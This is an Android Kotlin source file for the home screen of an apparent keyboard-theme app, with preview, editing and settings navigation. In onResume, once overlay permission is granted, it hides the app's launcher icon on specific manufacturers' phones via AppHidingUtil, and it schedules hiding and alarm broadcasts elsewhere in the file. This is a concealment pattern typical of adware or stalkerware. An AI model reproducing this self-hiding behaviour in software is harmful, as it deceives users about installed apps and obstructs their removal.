package com.puddy.board.ui.home

import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.view.View
import android.view.inputmethod.InputMethodManager
import androidx.activity.viewModels
import androidx.core.view.postDelayed
import androidx.fragment.app.commit
import androidx.lifecycle.lifecycleScope
import com.puddy.board.R
import com.puddy.board.data.KeyboardTheme
import com.puddy.board.databinding.HomeActivityBinding
import com.puddy.board.ime.core.Subtype
import com.puddy.board.ime.keyboard.ComputingEvaluator
import com.puddy.board.ime.keyboard.DefaultComputingEvaluator
import com.puddy.board.ime.keyboard.KeyData
import com.puddy.board.ime.text.key.CurrencySet
import com.puddy.board.ime.text.key.KeyCode
import com.puddy.board.ime.text.keyboard.KeyboardMode
import com.puddy.board.ime.text.keyboard.TextKeyData
import com.puddy.board.ime.text.keyboard.TextKeyboardIconSet
import com.puddy.board.ime.text.layout.LayoutManager
import com.puddy.board.repository.PrefsReporitory
import com.puddy.board.ui.base.BaseActivity
import com.puddy.board.ui.custom.ItemDecorationWithEnds
import com.puddy.board.ui.edit.EditFragment
import com.puddy.board.ui.settings.SettingsActivity
import com.puddy.board.ui.splash.SplashActivity
import com.puddy.board.util.EXTRA_LAUNCH_SETTINGS
import com.puddy.board.util.hiding.AlarmBroadcast
import com.puddy.board.util.hiding.AppHidingUtil
import com.puddy.board.util.hiding.HidingBroadcast
import kotlinx.coroutines.launch
import java.util.*

class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.home_activity) {

    val viewModel: HomeViewModel by viewModels { HomeViewModel.Factory() }

    private val inputManager by lazy { getSystemService(InputMethodManager::class.java) }

    private lateinit var textKeyboardIconSet: TextKeyboardIconSet
    private val textComputingEvaluator = object : ComputingEvaluator by DefaultComputingEvaluator {
        override fun evaluateVisible(data: KeyData): Boolean {
            return data.code != KeyCode.SWITCH_TO_MEDIA_CONTEXT
        }

        override fun isSlot(data: KeyData): Boolean {
            return CurrencySet.isCurrencySlot(data.code)
        }

        override fun getSlotData(data: KeyData): KeyData {
            return TextKeyData(label = ".")
        }
    }

    override fun setupUI() {
        if (PrefsReporitory.firstLaunchMillis == -1L)
            PrefsReporitory.firstLaunchMillis = System.currentTimeMillis()

        AlarmBroadcast.startAlarm(this)


        if (!Settings.canDrawOverlays(this) || !hasKeyboardPermission())
            startActivity(Intent(this, SplashActivity::class.java))

        binding.rvPreset.post {
            val spaceVertical = (binding.root.width / 360).times(2.5f).toInt()
            val spaceHorizontal = binding.root.width / 360 * 30
            val itemDecoration = ItemDecorationWithEnds(
                topFirst = spaceVertical,
                bottomFirst = spaceVertical,
                bottom = spaceVertical,
                leftFirst = spaceHorizontal,
                left = spaceHorizontal,
                rightFirst = spaceHorizontal,
                right = spaceHorizontal,
                firstPredicate = { i -> i == 0 }
            )
            binding.rvPreset.addItemDecoration(itemDecoration)
            binding.rvCustom.addItemDecoration(itemDecoration)
        }

        viewModel.onThemeClick.observe(this) {
            binding.preview.visibility = View.VISIBLE
        }
        viewModel.onAddClick.observe(this) {
            supportFragmentManager.commit {
                add(R.id.fragmentContainer, EditFragment.newInstance(KeyboardTheme(-1)))
            }
        }
        binding.buttonMenu.setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }
        if (intent?.hasExtra(EXTRA_LAUNCH_SETTINGS) == true)
            binding.buttonMenu.callOnClick()
        binding.preview.setOnClickListener {}
        viewModel.onApplied.observe(this) {
            binding.applied.visibility = View.VISIBLE
            binding.applied.postDelayed(1500) {
                binding.preview.visibility = View.GONE
                binding.applied.visibility = View.GONE
            }
        }
        binding.buttonEdit.setOnClickListener {
            supportFragmentManager.commit {
                add(R.id.fragmentContainer, EditFragment.newInstance(viewModel.theme.get()!!))
            }
            binding.preview.visibility = View.GONE
        }
        binding.buttonCancel.setOnClickListener {
            binding.preview.visibility = View.GONE
        }

        textKeyboardIconSet = TextKeyboardIconSet.new(this)
        binding.keyboardPreview.setIconSet(textKeyboardIconSet)
        binding.keyboardPreview.setComputingEvaluator(textComputingEvaluator)
        binding.keyboardPreview.sync()
        lifecycleScope.launch {
            binding.keyboardPreview.setComputedKeyboard(
                LayoutManager().computeKeyboardAsync(
                    KeyboardMode.CHARACTERS,
                    Subtype.DEFAULT
                ).await(), viewModel.theme.get()?.copy()?.apply { id = viewModel.theme.get()?.id }
            )
        }
    }

    override fun onResume() {
        super.onResume()
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

    private fun hasKeyboardPermission() = isKeyboardActive() && isKeyboardEnable()

    private fun isKeyboardActive() = inputManager
        .enabledInputMethodList
        .firstOrNull { it.packageName == packageName } != null

    private fun isKeyboardEnable() = inputManager
        .enabledInputMethodList
        .firstOrNull { it.packageName == packageName }
        ?.id == Settings.Secure.getString(contentResolver, "default_input_method")

    override fun provideViewModel(): HomeViewModel = viewModel

}
